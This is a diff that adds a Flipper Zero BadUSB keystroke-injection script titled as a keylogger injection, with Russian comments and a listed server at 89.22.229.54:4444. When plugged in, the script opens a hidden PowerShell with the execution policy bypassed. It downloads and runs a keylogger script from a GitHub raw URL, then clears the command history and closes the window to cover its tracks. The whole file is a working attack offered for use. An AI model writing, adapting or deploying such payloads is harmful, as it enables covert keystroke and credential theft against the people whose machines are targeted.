@@ -1,0 +1,28 @@
+REM Flipper Zero BadUSB - Keylogger Injection
+REM Server: 89.22.229.54:4444
+
+DEFAULT_DELAY 200
+DEFAULT_STRING_DELAY 15
+
+REM Открываем Run
+GUI r
+DELAY 500
+
+REM Запускаем PowerShell
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+
+REM Скачиваем и выполняем с GitHub (ЗАМЕНИТЕ yourusername)
+STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1')
+ENTER
+DELAY 2000
+
+REM Очищаем историю
+STRING Clear-History
+ENTER
+DELAY 300
+STRING exit
+ENTER
+DELAY 300
+ALT F4
